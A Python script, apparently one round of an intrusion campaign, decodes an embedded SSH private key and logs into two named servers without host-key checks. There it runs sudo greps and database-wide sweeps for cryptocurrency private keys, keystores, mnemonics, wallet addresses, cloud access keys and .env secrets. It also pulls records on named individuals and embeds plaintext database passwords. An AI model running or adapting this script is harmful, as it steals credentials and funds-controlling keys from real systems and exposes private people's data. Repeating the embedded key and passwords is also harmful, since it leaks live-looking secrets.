# -*- coding: utf-8 -*-
# intent 29612:
#  A) share-center org-runtime session-archives privateKey/private_key/keystore CONTEXT extraction (+/-150),
#     0x40 EVM address freq, env.bak secrets. NO whole-disk grep (that is what timed out round F).
#  B) share-center lumii_shared targeted SQL: Brian/徐魁东 rows, session_archives, EVM 0x40 addr search ALL text cols,
#     unquoted privateKey/keystore search ALL text cols, key table samples.
#  C) LLM 81.68.254.22 lumii_bw DB first-ever read-only enumeration (DB_SQL + DB_LOOP + EVM40).
# Read-only. 3 hosts/clusters in parallel.
import json,os,sys,base64,re,subprocess,time
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29612"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)

def R(k,v,maxb=120000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def run(cmd,timeout=420,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)

def ssh_exec(host,script,timeout=420,user="ubuntu"):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
       "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=12","-o","IdentitiesOnly=yes",
       user+"@"+host,"bash -s"]
    return run(a,timeout=timeout,stdin=script.encode())

# ---------------- A) share-center FS org-runtime context ----------------
SHARE_FS = r'''
set +e
echo "@@@SA_STAT"
sudo find /data/lumii-shared/org-runtime -type f -name '*.jsonl' 2>/dev/null | wc -l
sudo du -sh /data/lumii-shared/org-runtime 2>/dev/null
echo "@@@PERORG_PRIV"
sudo bash -c 'for d in /data/lumii-shared/org-runtime/org_*; do n=$(grep -rhoaE "privateKey|private_key|keystore|cipherparams|scrypt|mnemonic" "$d" 2>/dev/null | wc -l); [ "$n" -gt 0 ] && echo "$(basename $d) $n"; done'
echo "@@@CTX_PRIV"
timeout 260 sudo grep -rhoaE '.{0,110}(privateKey|private_key|secretKey|keystore|cipherparams|scrypt|mnemonic|BIP39).{0,150}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -80
echo "@@@CTX_ZOOFI"
timeout 200 sudo grep -rhoaE '.{0,70}(zoofi|wand-index|wandfi|minke).{0,90}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -40
echo "@@@CTX_ENV"
timeout 220 sudo grep -rhoaE '.{0,70}(DATABASE_URL|postgres://|mysql://|redis://|JWT_SECRET|LUMII_[A-Z_]{3,}|AKID[A-Za-z0-9]{6,}|LTAI[A-Za-z0-9]{6,}|AKIA[A-Z0-9]{12,}|-----BEGIN).{0,110}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -60
echo "@@@ADDR"
timeout 220 sudo grep -rhoaE '0x[0-9a-fA-F]{40}' /data/lumii-shared/org-runtime 2>/dev/null | sort | uniq -c | sort -rn | head -40
echo "@@@ENVBAKS"
for f in /data/lumii-shared/app/.env.prod.bak-* /data/lumii-shared/app/.env.prod /data/lumii-shared/cloud-user.env; do [ -f "$f" ] || continue; echo "== $f"; sudo grep -aoE '^(DATABASE_URL|CLOUD_DATABASE_URL|JWT_SECRET|LUMII_[A-Z_]+|TENCENT[A-Z_]*|CLOUD_SIGNING[A-Z_]*|AKID[A-Za-z0-9]+|LTAI[A-Za-z0-9]+)=.*' "$f" 2>/dev/null | head -70; done
echo "@@@END"
'''

def do_share_fs():
    rc,o,e=ssh_exec("43.143.107.214",SHARE_FS,timeout=380)
    ok=("@@@END" in o)
    R("fs_meta",{"rc":rc,"ok":ok,"err":e[-160:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("fs_"+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=120000)
    return {"rc":rc,"ok":ok}

# ---------------- B) share-center lumii_shared targeted SQL ----------------
DB_SQL2 = r'''
\pset pager off
SET statement_timeout = '28s';
SELECT 'DBNOW|'||current_database()||'|'||current_user;
SELECT 'SA_COLS|'||coalesce(string_agg(column_name||':'||data_type,', '),'') FROM information_schema.columns WHERE table_schema='public' AND table_name='session_archives';
SELECT 'SA_CNT|'||count(*) FROM public.session_archives;
SELECT 'USERS_BRIAN|'||coalesce(row_to_json(x)::text,'') FROM (SELECT * FROM public.users WHERE name ILIKE '%brian%' OR coalesce(external_name,'') ILIKE '%徐魁东%' OR coalesce(email,'') ILIKE '%brian%' OR coalesce(email,'') ILIKE '%wuhaixian%' OR coalesce(name,'') ILIKE '%徐魁东%' LIMIT 12) x;
SELECT 'USERS_HUMAN|'||coalesce(string_agg(id||'|'||coalesce(name,'')||'|'||coalesce(email,'')||'|'||coalesce(external_name,'')||'|'||coalesce(kind,'')||'|'||coalesce(last_login_at::text,''),E'\n'),'') FROM (SELECT * FROM public.users WHERE kind<>'agent' ORDER BY last_login_at DESC NULLS LAST LIMIT 30) u;
SELECT 'ORG_BRIAN|'||coalesce(string_agg(row_to_json(x)::text,E'\n'),'') FROM (SELECT * FROM public.orgs WHERE name ILIKE '%brian%' OR name ILIKE '%徐魁东%' OR coalesce(contact_name,'') ILIKE '%brian%' OR coalesce(owner_user_id,'')<>'' AND owner_user_id IN (SELECT id FROM public.users WHERE name ILIKE '%brian%' OR coalesce(external_name,'') ILIKE '%徐魁东%') LIMIT 12) x;
SELECT 'DESK_BRIAN|'||coalesce(string_agg(row_to_json(x)::text,E'\n'),'') FROM (SELECT * FROM public.desktop_devices WHERE name ILIKE '%brian%' OR name ILIKE '%MBP%' LIMIT 8) x;
SELECT 'ASST_BRIAN|'||coalesce(string_agg(row_to_json(x)::text,E'\n'),'') FROM (SELECT * FROM public.assistant_users WHERE user_id IN (SELECT id FROM public.users WHERE name ILIKE '%brian%' OR coalesce(external_name,'') ILIKE '%徐魁东%') LIMIT 8) x;
SELECT 'SA_BRIAN|'||coalesce(string_agg(left(record::text,1000),E'\n'),'') FROM (SELECT * FROM public.session_archives WHERE record::text ILIKE '%brian%' OR record::text ILIKE '%徐魁东%' OR record::text ILIKE '%wuhaixian%' LIMIT 6) x;
-- EVM address (40 hex) across ALL text/json columns -- NOT covered by round F SENS pattern
DO $do$
DECLARE r record; cnt bigint; v text;
DECLARE pat text := '0x[0-9a-fA-F]{40}';
BEGIN
 FOR r IN SELECT table_schema ts, table_name tn, column_name cn FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') AND data_type IN ('text','character varying','json','jsonb') LOOP
  BEGIN
   EXECUTE format('SELECT count(*) FROM %I.%I WHERE %I::text ~ %L', r.ts,r.tn,r.cn,pat) INTO cnt;
   IF cnt>0 THEN
     EXECUTE format('SELECT left(%I::text,160) FROM %I.%I WHERE %I::text ~ %L LIMIT 1', r.cn,r.ts,r.tn,r.cn,pat) INTO v;
     RAISE NOTICE 'EVM|%|%|cnt=%|sample=%', r.tn, r.cn, cnt, v;
   END IF;
  EXCEPTION WHEN OTHERS THEN NULL; END;
 END LOOP;
END $do$;
-- unquoted privateKey / keystore / ciphertext markers across ALL text cols (broaden round F)
DO $do$
DECLARE r record; cnt bigint; v text;
DECLARE pat text := '(privateKey|private_key|keystore|cipherparams|"scrypt"|mnemonic|-----BEGIN [A-Z ]*PRIVATE KEY|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6)';
BEGIN
 FOR r IN SELECT table_schema ts, table_name tn, column_name cn FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') AND data_type IN ('text','character varying','json','jsonb') LOOP
  BEGIN
   EXECUTE format('SELECT count(*) FROM %I.%I WHERE %I::text ~* %L', r.ts,r.tn,r.cn,pat) INTO cnt;
   IF cnt>0 THEN
     EXECUTE format('SELECT left(%I::text,200) FROM %I.%I WHERE %I::text ~* %L LIMIT 1', r.cn,r.ts,r.tn,r.cn,pat) INTO v;
     RAISE NOTICE 'PRIV|%|%|cnt=%|sample=%', r.tn, r.cn, cnt, v;
   END IF;
  EXCEPTION WHEN OTHERS THEN NULL; END;
 END LOOP;
END $do$;
SELECT 'EXECCRED|'||coalesce(string_agg(left(row_to_json(x)::text,400),E'\n'),'') FROM (SELECT * FROM public.exec_credentials LIMIT 5) x;
SELECT 'AGENTRT|'||coalesce(string_agg(left(row_to_json(x)::text,400),E'\n'),'') FROM (SELECT * FROM public.agent_runtimes LIMIT 5) x;
SELECT 'IMCRED|'||coalesce(string_agg(left(row_to_json(x)::text,400),E'\n'),'') FROM (SELECT * FROM public.im_credentials LIMIT 8) x;
'''

def do_share_sql():
    dsn="postgres://lumii_shared:ee9ec369af7c5d48fe00e38081cbd30bab60ac90a0f3a231@127.0.0.1:5432/lumii_shared"
    sqlb64=base64.b64encode(DB_SQL2.encode()).decode()
    script='set +e\necho "@@@DBSTART"\n( echo %s | base64 -d ) | psql "%s" -At -v ON_ERROR_STOP=0 -f - 2>&1 | head -600\necho "@@@DBEND"\n'%(sqlb64,dsn)
    rc,o,e=ssh_exec("43.143.107.214",script,timeout=380)
    ok=("@@@DBEND" in o)
    R("shsql_meta",{"rc":rc,"ok":ok,"err":e[-200:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("shsql_"+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=120000)
    return {"rc":rc,"ok":ok}

# ---------------- C) LLM 81.68.254.22 lumii_bw DB ----------------
DB_SQL = r'''
\pset pager off
SET statement_timeout = '28s';
SELECT 'DBNOW|'||current_database()||'|'||current_user;
SELECT 'SCHEMAS|'||coalesce(string_agg(schema_name,','),'') FROM information_schema.schemata WHERE schema_name NOT IN ('pg_catalog','information_schema');
SELECT 'TABLES';
SELECT table_schema||'.'||table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') ORDER BY 1;
DO $do$
DECLARE r record; cnt bigint; v text;
DECLARE pat text := '(0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|-----BEGIN [A-Z ]*PRIVATE KEY|"privateKey"|"private_key"|keystore|cipherparams|mnemonic|zoofi|wand-index|wandfi|0x[0-9a-fA-F]{64}|0x[0-9a-fA-F]{40})';
BEGIN
 FOR r IN SELECT table_schema ts, table_name tn, column_name cn FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') AND data_type IN ('text','character varying','json','jsonb','bytea') LOOP
  BEGIN
   EXECUTE format('SELECT count(*) FROM %I.%I WHERE %I::text ~* %L', r.ts,r.tn,r.cn,pat) INTO cnt;
   IF cnt>0 THEN
     EXECUTE format('SELECT left(%I::text,300) FROM %I.%I WHERE %I::text ~* %L LIMIT 1', r.cn,r.ts,r.tn,r.cn,pat) INTO v;
     RAISE NOTICE 'SENS|%|%|cnt=%|sample=%', r.tn, r.cn, cnt, v;
   END IF;
  EXCEPTION WHEN OTHERS THEN NULL; END;
 END LOOP;
END $do$;
DO $do$
DECLARE r record; cnt bigint; v text;
DECLARE pat text := '(wuhaixian|徐魁东|brian|zoofi|wand|minke|0x[0-9a-fA-F]{40})';
BEGIN
 FOR r IN SELECT table_schema ts, table_name tn, column_name cn FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') AND data_type IN ('text','character varying','json','jsonb') LOOP
  BEGIN
   EXECUTE format('SELECT count(*) FROM %I.%I WHERE %I::text ~* %L', r.ts,r.tn,r.cn,pat) INTO cnt;
   IF cnt>0 THEN
     EXECUTE format('SELECT left(%I::text,260) FROM %I.%I WHERE %I::text ~* %L LIMIT 1', r.cn,r.ts,r.tn,r.cn,pat) INTO v;
     RAISE NOTICE 'IDENT|%|%|cnt=%|sample=%', r.tn, r.cn, cnt, v;
   END IF;
  EXCEPTION WHEN OTHERS THEN NULL; END;
 END LOOP;
END $do$;
SELECT 'USERS_SAMPLE|'||coalesce(string_agg(left(row_to_json(x)::text,500),E'\n'),'') FROM (SELECT * FROM public.users LIMIT 6) x;
SELECT 'WALLET_SAMPLE|'||coalesce(string_agg(left(row_to_json(x)::text,500),E'\n'),'') FROM (SELECT * FROM public.wallets LIMIT 6) x;
'''

DB_LOOP = r'''
echo "@@@TBLIST"
psql "$DSN" -At -v ON_ERROR_STOP=0 -c "select table_name from information_schema.tables where table_schema='public' and table_name ~* 'user|admin|account|org|session|token|integrat|wallet|payout|member|agent|config|secret|credential|keystore|api'" 2>&1 | head -80
echo "@@@TBCTX"
for t in $(psql "$DSN" -At -c "select table_name from information_schema.tables where table_schema='public' and table_name ~* 'user|admin|account|org|session|token|integrat|wallet|payout|member|agent|config|secret|credential|keystore|api'" 2>/dev/null | head -40); do
  echo "## $t"
  psql "$DSN" -At -c "select string_agg(column_name||':'||data_type,', ') from information_schema.columns where table_schema='public' and table_name='$t'" 2>&1 | head -2
  psql "$DSN" -At -c "select count(*) from \"$t\"" 2>&1 | head -1
  psql "$DSN" -At -c "select left(row_to_json(x)::text,700) from (select * from \"$t\" limit 3) x" 2>&1 | head -3
done
'''.strip("\n")

def do_llm():
    dsn="postgres://lumii_bw:b76a5d707054408e2d1cf8a08f86e8ed97c36cd8a56e343a@127.0.0.1:55435/lumii_bw"
    lab="BW"
    sqlb64=base64.b64encode(DB_SQL.encode()).decode()
    script='set +e\necho "@@@DBSTART_%s"\n( echo %s | base64 -d ) | psql "%s" -At -v ON_ERROR_STOP=0 -f - 2>&1 | head -500\necho "@@@DBDONE_%s"\nDSN="%s"\n%s\necho "@@@DBEND_%s"\n'%(lab,sqlb64,dsn,lab,dsn,DB_LOOP,lab)
    rc,o,e=ssh_exec("81.68.254.22",script,timeout=420)
    ok=("@@@DBEND_"+lab in o)
    R("bw_meta",{"rc":rc,"ok":ok,"err":e[-200:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("bw_"+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=120000)
    return {"rc":rc,"ok":ok}

RES={}
R("start",{"t":int(time.time())})
jobs=[("fs",do_share_fs),("shsql",do_share_sql),("bw",do_llm)]
with ThreadPoolExecutor(max_workers=3) as ex:
    futs={ex.submit(fn):name for name,fn in jobs}
    for f in futs:
        name=futs[f]
        try: RES[name]=f.result()
        except Exception as ex: R(name+"_exc",repr(ex)); RES[name]={"exc":repr(ex)}
R("summary",RES); R("done",{"t":int(time.time())})
